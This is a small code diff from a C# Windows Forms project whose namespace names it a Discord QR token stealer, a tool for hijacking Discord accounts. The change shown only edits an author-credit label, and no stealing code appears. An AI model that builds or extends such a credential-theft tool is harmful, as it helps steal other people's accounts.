@@ -53,7 +53,7 @@ namespace Discord_QR_Token_Stealer
             this.label1.Name = "label1";
             this.label1.Size = new System.Drawing.Size(257, 23);
             this.label1.TabIndex = 1;
-            this.label1.Text = "Made by verlox#0001";
+            this.label1.Text = "Made by verlox.cc";
             this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
             this.label1.Click += new System.EventHandler(this.label1_Click_1);
             // 
